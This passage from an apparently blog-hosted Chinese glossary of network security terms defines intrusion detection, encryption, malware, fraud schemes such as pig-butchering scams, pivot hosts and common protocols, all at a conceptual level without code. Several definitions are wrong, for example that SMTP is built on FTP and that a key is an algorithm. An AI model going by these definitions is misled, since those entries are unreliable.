System的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker，通过网络进行的入侵行为。</p><p>NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。</p><h2 id="IPS（入侵防御系统）"><a href="#IPS（入侵防御系统）" class="headerlink" title="IPS（入侵防御系统）"></a>IPS（入侵防御系统）</h2><p>入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。</p><p>入侵防御系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的终端、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p><p>简单来说：就是防御用的，IDS是检测用的，常常一起使用。</p><h2 id="规则库（规则库）"><a href="#规则库（规则库）" class="headerlink" title="规则库（规则库）"></a>规则库（规则库）</h2><p>规则库（rule base）是2018年公布的计算机科学技术名词。由规则组成的知识库。是基于规则的专家系统的重要组成部分。</p><p>简单来说：规则库就是网络安全的核心数据库，类似于黑白名单，用于存储大量安全规则，一旦访问行为和规则库完成匹配，则被认为是非法行为。所以有人也将规则库比喻为网络空间的法律。</p><h2 id="侵预（侵预）"><a href="#侵预（侵预）" class="headerlink" title="侵预（侵预）"></a>侵预（侵预）</h2><p>一般作为防火墙和防病毒软件的补充来投入使用。</p><h2 id="告警（告警）"><a href="#告警（告警）" class="headerlink" title="告警（告警）"></a>告警（告警）</h2><p>系统发生故障时，监控单元将视故障情况给出告警信号，所有故障均有声光告警及文字提示。告警时，监控单元上的红色告警灯亮，蜂鸣声发出报警声，并向远端监控中心发出告警信息。</p><p>指网络安全设备对攻击行为产生的警报，误报也称为无效告警，通常指告警错误，即把合法行为判断成非法行为而产生了告警，目前，由于攻击技术的快速进步和检测技术的限制，误报的数量非常大，使得安全人员不得不花费大量时间来处理此类告警，已经成为困扰并拉低日常安全处置效率的主要原因。</p><h2 id="漏报（漏报）"><a href="#漏报（漏报）" class="headerlink" title="漏报（漏报）"></a>漏报（漏报）</h2><p>通常指网络安全设备没有检测出非法行为而没有产生告警。</p><p>一旦出现漏报，将大幅增加系统被入侵的风险。</p><p>可以联想一下疫情，如果产生漏报产生危害的风险是很大的。</p><h2 id="NAC（NAC）"><a href="#NAC（NAC）" class="headerlink" title="NAC（NAC）"></a>NAC（NAC）</h2><p>全称为NetworkAccess Control，即网络准入控制，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。</p><p>网络准入控制 (NAC) 是一项由思科发起、多家厂商参加的计划，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。</p><p>借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入。</p><h2 id="上网行为管理（上网行为管理）"><a href="#上网行为管理（上网行为管理）" class="headerlink" title="上网行为管理（上网行为管理）"></a>上网行为管理（上网行为管理）</h2><p>上网行为管理产品及技术是专用于防止非法信息恶意传播，避免国家机密、商业信息、科研成果泄漏的产品；并可实时监控、管理网络资源使用情况，提高整体工作效率。上网行为管理产品系列适用于需实施内容审计与行为监控、行为管理的网络环境，尤其是按等级进行计算机信息系统安全保护的相关单位或部门。</p><p>简单来说：是指帮助互联网用户控制和管理对互联网使用的设备，其包括对网页访问过滤、上网隐私保护、网络应用控制、带宽流量管理、信息收发审计、用户行为分析等。</p><h2 id="下一代（下一代防火墙）"><a href="#下一代（下一代防火墙）" class="headerlink" title="下一代（下一代防火墙）"></a>下一代（下一代防火墙）</h2><p>下一代，即Next Generation。</p><p>网络安全领域经常用到，用于表示产品或者技术有较大幅度的创新，在能力上相对于传统方法有明显的进步，通常缩写为NG（NextGen）<br>例如：NGFW（下一代防火墙）、NGSOC（下一代安全管理平台）等</p><p>简单来说：就是创新较大的产品或者技术。</p><h2 id="VPN（虚拟专用网络）"><a href="#VPN（虚拟专用网络）" class="headerlink" title="VPN（虚拟专用网络）"></a>VPN（虚拟专用网络）</h2><p>虚拟专用网络(VPN)的功能是：在公用网络上建立专用网络，进行加密通讯。</p><p>在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。</p><p>VPN可通过服务器、硬件、软件等多种方式实现。</p><h2 id="边界防御（边界防御）"><a href="#边界防御（边界防御）" class="headerlink" title="边界防御（边界防御）"></a>边界防御（边界防御）</h2><p>“边界防御”是国内知名安全企业金山率先提出的防病毒技术理念，该技术在金山毒霸2012中第一次应用。</p><p>与传统的防病毒技术理念最大的不同在于，”边界防御”强调”不中毒才是最佳安全解决方案”，通过对外界程序进入电脑的监控，在病毒尚未被运行时即可被判定为安全或不安全，从而最大限度地保障对本地计算机的安全防护。</p><h2 id="蠕虫病毒（蠕虫病毒）"><a href="#蠕虫病毒（蠕虫病毒）" class="headerlink" title="蠕虫病毒（蠕虫病毒）"></a>蠕虫病毒（蠕虫病毒）</h2><p>蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。</p><p>计算机病毒是指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据和恶意篡改系统。影响计算机使用并且能够自我复制的一组计算机指令或者程序代码。</p><p>它利用了WINDOWS系统的开放性特点，特别是COM到COM+的组件编程思路，一个脚本程序能调用功能更大的组件来完成自己的功能。</p><p>以VB脚本病毒为例，它们都是把VBS脚本文件加在附件中，使用*.HTM，VBS等欺骗性的文件名。</p><p>蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性</p><h2 id="杀毒软件（杀毒软件）"><a href="#杀毒软件（杀毒软件）" class="headerlink" title="杀毒软件（杀毒软件）"></a>杀毒软件（杀毒软件）</h2><p>杀毒软件，也称反病毒软件或防毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。</p><p>杀毒软件通常集成监控识别、病毒扫描和清除、自动升级、主动防御等功能，有的杀毒软件还带有-数据恢复、防范黑客入侵、网络流量控制等功能，是计算机防御系统（包含杀毒软件，防火墙，特洛伊木马和恶意软件的查杀程序，入侵防御系统等）的重要组成部分。</p><p>杀毒软件是一种可以对病毒、木马等一切已知的对计算机有危害的程序代码进行清除的程序工具。“杀毒软件”由国内的老一辈反病毒软件厂商起的名字，后来由于和世界反病毒业接轨统称为”反病毒软件”、”安全防护软件”或”安全软件”。</p><p>集成防火墙的”互联网安全套装”、”全功能安全套装”等用于消除电脑病毒、特洛伊木马和恶意软件的一类软件，都属于杀毒软件范畴。</p><p>简单来说：用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。</p><h2 id="恶意软件（流氓软件）"><a href="#恶意软件（流氓软件）" class="headerlink" title="恶意软件（流氓软件）"></a>恶意软件（流氓软件）</h2><p>恶意软件其实就是”流氓软件”，是介于病毒和正规软件之间的软件。</p><p>如果电脑中有流氓软件，可能会出现以下几种情况：用户使用电脑上网时，会有窗口不断跳出；电脑浏览器被莫名修改增加了许多工作条；当用户打开网页时，网页会变成不相干的奇怪画面，甚至是黄色广告。</p><p>有些流氓软件只是为了达到某种目的，比如广告宣传。</p><p>这些流氓软件虽然不会影响用户计算机的正常使用，但在当用户启动浏览器的时候会多弹出来一个网页，以达到宣传目的。</p><p>简单来说：就是被设计来达到非授权控制计算机或窃取计算机数据等多种恶意行为的程序。   </p><h2 id="间谍软件（间谍软件）"><a href="#间谍软件（间谍软件）" class="headerlink" title="间谍软件（间谍软件）"></a>间谍软件（间谍软件）</h2><p>简单来说：间谍软件一种能够在用户不知情的情况下，在其电脑、手机上安装后门，具备收集用户信息、监听、偷拍等功能的软件。</p><p>“间谍软件无处不在”，这是在计算机安全业界达成的共识。</p><p>据IDC在早前公布的数据中，估计大约67%的电脑都带有某种形式的间谍软件，而在权威机构不久前进行的一次调查显示，在认为自己的个人电脑很“干净”的人中，经过检查91%的接受调查者的计算机上都被安装了间谍软件。</p><h2 id="反间谍软件（反间谍软件）"><a href="#反间谍软件（反间谍软件）" class="headerlink" title="反间谍软件（反间谍软件）"></a>反间谍软件（反间谍软件）</h2><p>“间谍软件无处不在”，这是在计算机安全业界达成的共识。</p><p>简单来说：反间谍软件就是发现和消灭间谍病毒的软件。</p><h2 id="黑产（网络黑产）"><a href="#黑产（网络黑产）" class="headerlink" title="黑产（网络黑产）"></a>黑产（网络黑产）</h2><p>网络黑色产业链，是指利用互联网技术实施网络攻击、窃取信息、勒索诈骗、盗窃钱财、推广黄赌毒等网络违法行为，以及为这些行为提供工具、资源、平台等准备和非法获利变现的渠道与环节。</p><p>网络黑色产业链可分为上中下游：上游负责收集提供各种网络黑产资源，例如手机黑卡、动态代理等；中游负责开发定制大量黑产工具，以自动化手段组合利用各种黑产资源实施各种网络违法犯罪活动；下游负责将黑产活动“成果”进行交易变现，涉及众多黑灰色网络交易和支付渠道。</p><p>简单来说：网络黑产就是指以互联网为媒介，以网络技术为主要手段，为计算机信息系统安全和网络空间管理秩序，甚至国家安全、社会政治稳定带来潜在威胁（重大安全隐患）的非法行为。</p><p>例如：非法数据交易产业</p><h2 id="灰产（灰产）"><a href="#灰产（灰产）" class="headerlink" title="灰产（灰产）"></a>灰产（灰产）</h2><p>灰产，指处于法律灰色地带的”恶意注册”和”虚假认证”。</p><p>诈骗分子往往能够利用伪装的骗局以假乱真，达到骗取钱财的目的。</p><p>同时买卖公民个人信息、手机卡、银行卡、对公账户、工商营业执照、网络社交工具、网络支付账户等违法犯罪行为，为诈骗团伙提供犯罪工具，已成为助推电信网络诈骗犯罪的”黑灰产业”。</p><p>特点：</p><ol><li><p>骗局设计较为周密，模拟了互联网平台客户服务场景，从宣传引导到电话微信等客服交流，精心设计陷阱让首次接触的消费者难辨真假。</p></li><li><p>借助移动支付手段，利用了互联网信息管理不完善的漏洞。</p></li><li><p>暗网（暗网）<br>“暗网”是指隐藏的网络，普通网民无法通过常规手段搜索访问，需要使用一些特定的软件、配置或者授权等才能登录。一般用tor洋葱浏览器进入。</p></li></ol><p>暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。</p><p>由于”暗网”具有匿名性等特点，容易滋生以网络为勾联工具的各类违法犯罪，一些年轻人深陷其中。</p><p>互联网是一个多层结构，”表层网”处于互联网的表层，能够通过标准搜索引擎进行访问浏览。藏在”表层网”之下的被称为”深网”。深网中的内容无法通过常规搜索引擎进行访问浏览。”暗网”通常被认为是”深网”的一个子集，显著特点是使用特殊加密技术刻意隐藏相关互联网信息。 </p><p>2021年1月，德国捣毁了据信是全球最大的暗网交易平台，逮捕了运行的嫌疑人。</p><h2 id="黑页（黑页）"><a href="#黑页（黑页）" class="headerlink" title="黑页（黑页）"></a>黑页（黑页）</h2><p>一些计算机被入侵后，入侵者为了证明自己的存在，对网站主页（在服务器开放WEB服务的情况下）进行改写，从而公布入侵者留下的信息，这样的网页通常称为黑页。</p><p>黑页的意义：</p><p>黑页的意义有其消极的一方面，也有积极的一方面。</p><p>消极方面：</p><p>入侵者对网站主页的破坏，无疑会给网站带来经济、信誉等等方面的损失。</p><p>同时另一方面传播着入侵者留下的带有负面影响的信息或者病毒，严重影响网络安全。</p><p>积极方面：</p><p>对服务器管理人员作出最有效漏洞提醒，及时通知管理员打补丁。</p><p>同时也表现出入侵者的入侵目的。</p><h2 id="薅羊毛（薅羊毛）"><a href="#薅羊毛（薅羊毛）" class="headerlink" title="薅羊毛（薅羊毛）"></a>薅羊毛（薅羊毛）</h2><p>薅羊毛，本是沿袭春晚小品中白云大妈的”薅羊毛织毛衣”的做法，被定义为”薅羊毛”。</p><p>所谓薅羊毛就是指网赚一族利用各种网络金融产品或红包活动推广下线抽成赚钱，又泛指搜集各个银行等金融机构及各类商家的优惠信息，以此实现盈利的目的。</p><p>这类行为就被称之为薅羊毛。”薅羊毛”的定义已经不仅仅局限于互联网金融领域，已经渗透到社会各个领域，外卖优惠券、减免优惠、送话费、送流量等诸多活动，都可以称之为薅羊毛。</p><p>“薅羊毛”的定义越来越广泛，已经跨出了金融行业的界定，渗透到各个领域，嘀嘀打车等打车和拼车软件送代金券，美团外卖，饿了么点餐减免活动，百度钱包，免费送话费充流量等诸多活动，都可以称为薅羊毛。</p><p>简单来说：就是指网赚一族利用各种网络金融产品或红包活动推广下线抽成赚钱的行为就被称之为薅羊毛。</p><h2 id="杀猪盘（杀猪盘）"><a href="#杀猪盘（杀猪盘）" class="headerlink" title="杀猪盘（杀猪盘）"></a>杀猪盘（杀猪盘）</h2><p>杀猪盘是一个网络流行词，是指诈骗分子利用网络交友 ，诱导受害人投资赌博的一种电信诈骗方式<br>。</p><p>“杀猪盘”是”从业者们”（诈骗团伙）自己起的名字，是指放长线”养猪”诈骗，养得越久，诈骗得越狠。</p><p>诈骗分子准备好人设、交友套路等”猪饲料”，将社交平台称为”猪圈”，在其中寻找被他们称为”猪”的诈骗对象。通过建立恋爱关系，即”养猪”。最后骗取钱财，即”杀猪” 。</p><p>各行各业都有托，卖酒的有酒托，卖茶的有茶托，卖摩托车的有车托，这些年网络赌博兴起，赌场也安排”赌托”到网上招揽生意，后来有人发现赌博什么的弱爆了，直接把人骗到假赌场一宰更省事，于是真假网赌混杂在一起，逐渐发展出一套全新的咋骗模式。</p><p>简单来说：杀猪盘就是以各种手段方式培养信任为基础，一段时间获得对方信任后，以各种诱惑让被害人受骗损失钱财为目的的诈骗方式。</p><h2 id="威胁情报（威胁情报）"><a href="#威胁情报（威胁情报）" class="headerlink" title="威胁情报（威胁情报）"></a>威胁情报（威胁情报）</h2><p>根据Gartner的定义，威胁情报是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。</p><p>业内大多数所说的威胁情报可以认为是狭义的威胁情报，其主要内容为用于识别和检测威胁的失陷标识，如文件HASH，IP，域名，程序运行路径，注册表项等，以及相关的归属标签。</p><p>根据使用对象的不同，威胁情报主要分为人读情报和机读情报。</p><p>威胁情报旨在为面临威胁的资产主体(通常为资产所属企业或机构)提供全面的、准确的、与其相关的、并且能够执行和决策的知识和信息。</p><h2 id="加密技术（加密技术）"><a href="#加密技术（加密技术）" class="headerlink" title="加密技术（加密技术）"></a>加密技术（加密技术）</h2><p>加密技术是最常用的安全保密手段，利用技术手段把重要的数据变为乱码（加密）传送，到达目的地后再用相同或不同的手段还原（解密）。</p><p>加密技术包括两个元素：算法和密钥。算法是将普通的信息或者可以理解的信息与一串数字（密钥）结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解密的一种算法。</p><p>在安全保密中，可通过适当的钥加密技术和管理机制来保证网络的信息通信安全</p><p>加密技术包括两个元素：算法和密钥</p><p>算法是将普通的文本与一串数字（密钥）的结合，产生不可理解的密文的步骤</p><p>密钥是用来对数据进行编码和解码的一种算法密钥加密技术的密码体制分为对称密钥体制和非对称密钥体制两种。</p><p>相应地，对数据加密的技术分为两类，即对称加密（私人密钥加密）和非对称加密（公开密钥加密）。</p><p>对称加密的加密密钥和解密密钥相同，而非对称加密的加密密钥和解密密钥不同，加密密钥可以公开而解密密钥需要保密</p><h2 id="对称加密（对称加密）"><a href="#对称加密（对称加密）" class="headerlink" title="对称加密（对称加密）"></a>对称加密（对称加密）</h2><p>采用单钥密码系统的加密方法，同一个密钥可以同时用作信息的加密和解密，这种加密方法称为对称加密，也称为单密钥加密。</p><p>需要对加密和解密使用相同密钥的加密算法。由于其速度快，对称性加密通常在消息发送方需要加密大量数据时使用。对称性加密也称为密钥加密。</p><p>所谓对称，就是采用这种加密方法的双方使用方式用同样的密钥进行加密和解密。密钥是控制加密及解密过程的指令。算法是一组规则，规定如何进行加密和解密。</p><p>因此加密的安全性不仅取决于加密算法本身，密钥管理的安全性更是重要。因为加密和解密都使用同一个密钥，如何把密钥安全地传递到解密者手上就成了必须要解决的问题。</p><p>对称加密算法：DES、DESede、AES、IDEA、PBE等。</p><h2 id="非对称加密（非对称加密）"><a href="#非对称加密（非对称加密）" class="headerlink" title="非对称加密（非对称加密）"></a>非对称加密（非对称加密）</h2><p>对称加密算哒在密钥和解密时使用的是同一个密钥；而非对称加密算法需要两个密钥来进行加密和解密，这两个密钥是公开密钥（public key，简称公钥）和私有密钥（private key，简称私钥）。</p><p>非对称密码算法：RSA、Elgamal、背包算法、Rabin、D-H、ECC等。</p><h2 id="加密机（加密机）"><a href="#加密机（加密机）" class="headerlink" title="加密机（加密机）"></a>加密机（加密机）</h2><p>加密机是通过国家商用密码主管部门鉴定并批准使用的国内自主开发的主机加密设备，加密机和主机之间使用TCP/IP协议通信，所以加密机对主机的类型和主机操作系统无任何特殊的要求。</p><p>加密机功能模块：硬件加密部件、密钥管理菜单、加密机后台进程、加密机监控程序和后台监控进程等。</p><h2 id="嗅探（嗅探）"><a href="#嗅探（嗅探）" class="headerlink" title="嗅探（嗅探）"></a>嗅探（嗅探）</h2><p>嗅探计算机网络的共享通讯隧道的，支持每对通讯计算机独占通道的交换机/集线器仍然过于昂贵，共享意为着计算机能够接收到发送给其他计算机的信息，捕获在网络中传输的数据信息就称为嗅探。</p><p>一般指嗅探器，嗅探器可以获取网络上流经的数据包。</p><p>用集线器hub组建的网络是基于共享的原理的， 局域网内所有的计算机都接收相同的数据包， 而网卡构造了硬件的”过滤器”通过识别MAC地址过滤掉和自己无关的信息。</p><p>嗅探程序只需关闭这个过滤器， 将网卡设置为”混杂模式”就可以进行嗅探 用交换机switch组建的网络是基于”交换”原理的 ，交换机不是把数据包发到所有的端口上， 而是发到目的网卡所在的端口。</p><p>简单来说：嗅探就是窃听网络上流经的数据包。</p><h2 id="探针（探针）"><a href="#探针（探针）" class="headerlink" title="探针（探针）"></a>探针（探针）</h2><p>也叫作网络安全探针或者安全探针，可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警。</p><p>探针卡是一种测试接口，主要对裸芯进行测试，通过连接测试机和芯片，通过传输信号对芯片参数进行测试.。</p><p>2019年曝光的WiFi探针技术,甚至无需用户主动连接WiFi即可捕获个人信息。</p><p>简单来说：探针就是一种信号传输探测工具。</p><h2 id="跳板（跳板）"><a href="#跳板（跳板）" class="headerlink" title="跳板（跳板）"></a>跳板（跳板）</h2><p>一个具有辅助作用的机器，利用这个主机作为一个间接工具，控制其他主机，一般和肉鸡连用。</p><p>目的：就是为了隐藏自己的地址，让别人无法查找到自己的位置。</p><p>简单原理：</p><p>举个例子，你在A朋友家玩儿，发现了通往B朋友家的后门，然后你来到了B朋友家，又发现了C朋友家的厨房是和B朋友家相连的，你就顺便来到了C朋友的家，同时C朋友家的厕所又是和D朋友家相连。</p><p>你在A朋友家做了一些事情，比如设置和修改。</p><p>A朋友回家了，他会发现有人进了自己的家，但是他顺着路线可以找到B朋友家，通过长期的寻找，终于找到了C朋友家，但他遇见难题了，他并不知道是B朋友家的人动了自己的东西，还是D朋友家的人动了自己的东西。这时，你就是安全的了。</p><p>这中间的各种朋友关系，其实就是你的跳板。</p><p>通过这种跳板的转换，我们可以改变自己上网的IP位置，隐藏自己的真实物理位置。</p><h2 id="RARP（RARP）"><a href="#RARP（RARP）" class="headerlink" title="RARP（RARP）"></a>RARP（RARP）</h2><p>反向地址转换协议（RARP：Reverse Address Resolution Protocol）反向地址转换协议（RARP）允许局域网的物理机器从网关服务器的 ARP 表或者缓存上请求其 IP 地址。</p><p>网络管理员在局域网网关路由器里创建一个表以映射物理映射表（MAC）和与其对应的 IP 地址。</p><p>当设置一台新的机器时，其 RARP 客户机程序需要向路由器上的 RARP 服务器请求相应的 IP 地址。</p><p>假设在路由表中已经设置了一个记录，RARP 服务器将会返回 IP 地址给机器，此机器就会存储起来以便日后使用。</p><p>RARP 可以使用于以太网、光纤分布式数据接口及令牌环 LAN等。</p><p>简单来说：RARP就是将硬件地址映射到网络地址一种协议。</p><h2 id="UDP（UDP）"><a href="#UDP（UDP）" class="headerlink" title="UDP（UDP）"></a>UDP（UDP）</h2><p>internet协议集支持一个无连接的传输协议，该协议称为用户数据包协议（UDP，User Datagram Protocol）。</p><p>UDP 为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据包的方法。RFC 768</p><p>描述了 UDP。</p><p>Internet 的传输层有两个主要协议，互为补充。无连接的是 UDP，它除了给应用程序发送数据包功能并允许它们在所需的层次上架构自己的协议之外，几乎没有做什么特别的事情。面向连接的是 TCP，该协议几乎做了所有的事情。</p><p>简单来说：UDP是UserDatagram Protocol的简称，中文名是用户数据报协议，是OSI参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p><h2 id="TCP（TCP）"><a href="#TCP（TCP）" class="headerlink" title="TCP（TCP）"></a>TCP（TCP）</h2><p>传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793 定义。</p><p>TCP旨在适应支持多网络应用的分层协议层次结构。 连接到不同但互连的计算机通信网络的主计算机中的成对进程之间依靠TCP提供可靠的通信服务。TCP假设它可以从较低级别的协议获得简单的，可能不可靠的数据报服务。 原则上，TCP应该能够在从硬线连接到分组交换或电路交换网络的各种通信系统之上操作。</p><p>简单来说：TCP就是一种面向连接的、可靠的、基于字节流的传输层通信协议</p><h2 id="FTP（FTP）"><a href="#FTP（FTP）" class="headerlink" title="FTP（FTP）"></a>FTP（FTP）</h2><p>文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP，客户在和服务器建立连接前要经过一个”三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。</p><p>FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而， 用户并不真正登录到自己想要存取的计算机上面而成为完全用户， 可用FTP程序访问远程资源， 实现用户往返传输文件、目录管理以及访问电子邮件等等， 即使双方计算机可能配有不同的操作系统和文件存储方式。</p><p>简单来说：就是允许用户以文件操作的方式（文件的增、删、改、查、传送等）与另一主机相互通信的传输层的一种协议。</p><h2 id="SNTP（SNTP）"><a href="#SNTP（SNTP）" class="headerlink" title="SNTP（SNTP）"></a>SNTP（SNTP）</h2><p>简单网络时间协议（Simple Network Time Protocol），由 NTP 改编而来，主要用来同步因特网中的计算机时钟。在 RFC2030 中定义。</p><h2 id="SMTP（SMTP）"><a href="#SMTP（SMTP）" class="headerlink" title="SMTP（SMTP）"></a>SMTP（SMTP）</h2><p>SMTP是一种提供可靠且有效的电子邮件的协议。</p><p>SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。</p><p>SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即”SMTP邮件中继“。</p><p>使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继网或网关实现某处理进程与其他网络之间的邮件传输。</p><p>简单来说：SMTP就是为系统之间传送电子邮件的一种协议。</p><h2 id="TELNET（TELNET）"><a href="#TELNET（TELNET）" class="headerlink" title="TELNET（TELNET）"></a>TELNET（TELNET）</h2><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。</p><p>它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。</p><p>终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。</p><p>简单来说：TELNET就是允许用户以虚终端方式访问远程主机的一种协议。</p><h2 id="HTTP（HTTP）"><a href="#HTTP（HTTP）" class="headerlink" title="HTTP（HTTP）"></a>HTTP（HTTP）</h2><p>超文本传输协议（HypertextTransferProtocol，HTTP）是一个简单的请求-响应协议，它通常运行在TCP之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。</p><p>请求和响应消息的头以ASCLL形式给出；而消息内容则具有一个类似MIME的格式。</p><p>这个简单模型是早期web成功的有功之臣，因为它使开发和部署非常地直截了当。</p><p>简单来说：HTTP就是应用层的一个请求响应的协议。</p><h2 id="HTTPS（HTTPS）"><a href="#HTTPS（HTTPS）" class="headerlink" title="HTTPS（HTTPS）"></a>HTTPS（HTTPS）</h2><p>HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。</p><p>HTTPS 在HTTP 的基础下加入SSL，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。</p><p>HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP 之间）。</p><p>这个系统提供了身份验证与加密通讯方法。它被广泛用于 万维网上安全敏感的通讯，例如交易支付等方面。</p><p>简单来说：HTTP就是应用层的一个加密的请求响应的协议。</p><h2 id="ICMP（ICMP）"><a href="#ICMP（ICMP）" class="headerlink" title="ICMP（ICMP）"></a>ICMP（ICMP）</h2><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。</p><p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。</p><p>控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p><p>这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p>ICMP使用IP的基本支持，就像它是一个更高级别的协议，但是，ICMP实际上是IP的一个组成部分，必须由每个IP模块实现。</p><p>“ICMP协议”对于网络安全有着极其重要的意义，其本身的特性决定了它非常容易被用于攻击网络上的路由器和主机。</p><p>例如，曾经轰动一时的海信主页被黑事件就是以ICMP攻击为主的。由于操作系统规定ICMP数据包最大尺寸不超过64KB，因而如果向目标主机发送超过64KB上限的数据包，该主机就会出现内存分配错误，进而导致系统耗费大量的资源处理，疲于奔命，最终瘫痪、死机。</p><h2 id="DNS（DNS）"><a href="#DNS（DNS）" class="headerlink" title="DNS（DNS）"></a>DNS（DNS）</h2><p>域名系统（英文：Domain Name System：DNS）是互联网的一项服务。</p><p>它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p><p>DNS使用UDP端口53。</p><p>当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>简单来叔：DNS协议就是用来将域名解析到IP地址的一种协议，当然，也可以将IP地址转换为域名的一种协议这个就是拥有CDN的网站，想找到真实ip地址，需要绕过CDN。</p><h2 id="CDN（CDN）"><a href="#CDN（CDN）" class="headerlink" title="CDN（CDN）"></a>CDN（CDN）</h2><p>CDN的全称是Content Delivery Network，即内容分发网络。</p><p>CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><p>CDN的关键技术主要有内容存储和分发技术。</p><p>基本原理：</p><p>广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。</p><p>主要功能：</p><p>(1)节省骨干网带宽，减少带宽需求量；</p><p>(2)提供服务器端加速，解决由于用户访问量大造成的服务器过载问题；</p><p>(3)服务商能使用Web Cache技术在本地缓存用户访问过的Web页面和对象，实现相同对象的访问无须占用主干的出口带宽，并提高用户访问因特网页面的相应时间的需求；</p><p>(4)能克服网站分布不均的问题，并且能降低网站自身建设和维护成本；</p><p>(5)降低“通信风暴”的影响，提高网络访问的稳定性。</p><h2 id="TCP-IP（TCP-IP）"><a href="#TCP-IP（TCP-IP）" class="headerlink" title="TCP/IP（TCP/IP）"></a>TCP/IP（TCP/IP）</h2><p>TCP/IP传输协议，即传输控制/网络协议，也叫作网络通讯协议，是在网络的使用中的最基本的通信协议。</p><p>TCP/IP传输协议对互联网中各部分进行通信的标准和方法进行了规定。</p><p>TCP/IP传输协议是保证网络数据信息及时、完整传输的两个重要的协议。</p><p>TCP/IP传输协议是严格来说是一个四层的体系结构，应用层、传输层、网络层和数据链路层都包含其中。 </p><p>四层：</p><ol><li><p>应用层的主要协议有telnet、FTP、SMTP等，是用来接收来自传输层的数据或者按不同应用要求与方式将数据传输至传输层。</p></li><li><p>传输层的主要协议有UDP、TCP，是使用者使用平台和计算机信息网内部数据结合的通道，可以实现数据传输与数据共享。</p></li><li><p>网络层的主要协议有ICMP、IP、IGMP，主要负责网络中数据包的传送等。</p></li><li><p>网络访问层，也叫网路接口层或数据链路层，主要协议有ARP、RARP，主要功能是提供链路管理错误检测、对不同通信媒介有关信息细节问题进行有效处理等。</p></li><li><p>OSI（OSI）<br>意为开放式系统互联，国际标准化组织制定了OSI（Open System Interconnection）模型。</p></li></ol><p>这个模型把网络通信的工作分为7层，分别是物理层，数据链路层，网络层，传输层，会话层，表示层和应用层。</p><p>1至4层被认为是低层，这些层与数据移动密切相关。</p><p>5至7层是高层，包含应用程序级的数据。</p><p>每一层负责一项具体的工作，然后把数据传送到下一层。</p><p>具体的介绍可以查看链接。</p><h2 id="LAN（LAN）"><a href="#LAN（LAN）" class="headerlink" 